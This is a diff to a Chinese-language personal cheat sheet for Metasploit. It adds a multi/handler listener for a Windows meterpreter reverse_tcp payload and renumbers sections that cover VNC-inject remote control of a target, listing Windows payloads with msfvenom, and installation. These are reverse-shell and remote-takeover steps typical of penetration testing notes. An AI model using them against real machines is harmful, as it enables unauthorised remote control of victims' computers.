@@ -1,4 +1,13 @@
-# 01 远程控制
+# 0x01 常用命名
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.100
+set lport 4444
+run
+```
+
+# 0x02 远程控制
 ```
 选择windows/x64/vncinject/reverse_tcp，设置AUTOVNC为false，run之后，再开启vncviewer，配置如下
 
@@ -12,13 +21,15 @@ run
 
 目标主机执行payload后，监听器需成功接收反连，然后打开vncviewer，访问127.0.0.1:5900
 ```
-# 02 检索包含windows的Payload
+
+# 0x03 检索包含windows的Payload
 ```
 经测试发现，每行开头有4个空格
 
 msfvenom -l payloads | grep "^   windows"
 ```
-# 03 各个平台下的安装
+
+# 0x04 各个平台下的安装
 发现自己经常需要在新环境下安装Metasploit，每次都要查阅官方文档效率有点低，故有此笔记
 ```
 # Windows下安装
